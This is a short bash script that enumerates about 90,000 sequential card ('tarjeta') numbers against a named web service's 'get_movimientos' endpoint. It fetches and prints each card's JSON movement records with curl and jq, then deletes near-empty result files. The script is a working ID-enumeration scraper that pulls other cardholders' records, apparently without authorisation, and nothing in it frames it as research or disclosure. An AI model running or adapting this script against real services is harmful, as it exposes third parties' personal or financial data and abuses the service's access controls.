#!/bin/bash
         COUNTER=10000
         while [  $COUNTER -lt 99999 ]; do
             tarjeta=100
             tarjeta+=$COUNTER
             echo ========== Tarjeta $tarjeta ============
             url="http://www.gpssumo.com/movimientos/get_movimientos/"
             url+=$tarjeta 
#             curl --silent --output $tarjeta.txt $url
             curl --silent $url | jq '.'
             let COUNTER=COUNTER+1 
         done



find . -name "*.txt" -size -3c -delete
